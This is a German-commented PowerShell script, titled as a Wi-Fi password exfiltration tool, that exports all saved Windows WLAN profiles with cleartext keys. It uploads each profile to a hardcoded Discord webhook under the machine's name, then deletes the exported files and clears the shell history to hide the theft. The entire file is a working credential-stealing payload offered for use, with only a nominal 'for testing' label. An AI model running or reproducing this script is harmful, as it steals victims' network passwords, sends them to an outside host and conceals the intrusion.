# WLAN-Windows-Passwords-Discord-Exfiltration (updated version)
# Author: true_lock (original) / improved for testing
# Webhook URL (CHANGE IF YOU REGENERATE IT!)
$whuri = 'https://discord.com/api/webhooks/1482772602949734664/AfhCMz1wQKiszM25JquwYHfnAfELsXRXbwmk9m9eWwjnF9qQnHTJxqUt_yR-0U_g7KIk'

# Export-Verzeichnis
$exportDir = "$env:temp\SomeStuff"

# Sicherstellen, dass das Exportverzeichnis existiert
if (-not (Test-Path $exportDir)) {
    try {
        New-Item -ItemType Directory -Path $exportDir -Force | Out-Null
    } catch {
        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
        return
    }
}

# WLAN-Profile exportieren (inkl. Schlüssel im Klartext)
try {
    netsh wlan export profile key=clear folder=$exportDir | Out-Null
} catch {
    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
    return
}

# Alle exportierten XML-Dateien lesen
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml" -ErrorAction SilentlyContinue

if ($xmlFiles.Count -eq 0) {
    Write-Host "Keine exportierten WLAN-Profile gefunden."
    # Cleanup trotzdem versuchen
} else {
    # Webhook-Anfrage mit Datei-Upload (eine Nachricht pro Profil)
    foreach ($xmlFile in $xmlFiles) {
        # Bereite die Daten vor
        $formData = @{
            "username" = "$env:COMPUTERNAME"
            "content"  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
        }

        # Setze Header für multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"
        $body = ""

        # Füge Textfelder hinzu
        foreach ($key in $formData.Keys) {
            $body += "--$boundary`r`n"
            $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
            $body += "`r`n"
            $body += "$($formData[$key])`r`n"
        }

        # Füge die Datei hinzu
        $body += "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($xmlFile.Name)`"`r`n"
        $body += "Content-Type: application/octet-stream`r`n"
        $body += "`r`n"
        $body += [System.IO.File]::ReadAllText($xmlFile.FullName)
        $body += "`r`n"
        $body += "--$boundary--`r`n"

        # Body in Bytes umwandeln
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

        # Anfrage senden
        try {
            $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
                "Content-Type" = $contentType
            }
            Write-Host "Erfolgreich an den Webhook gesendet: $($xmlFile.Name)"
        } catch {
            Write-Host "Fehler beim Senden an den Webhook: $_"
        }
    }
}

# Cleanup: Alle Dateien und Ordner löschen
try {
    Remove-Item -Path $exportDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Temporäre Dateien erfolgreich gelöscht."
} catch {
    Write-Host "Fehler beim Löschen der temporären Dateien: $_"
}

Clear-History
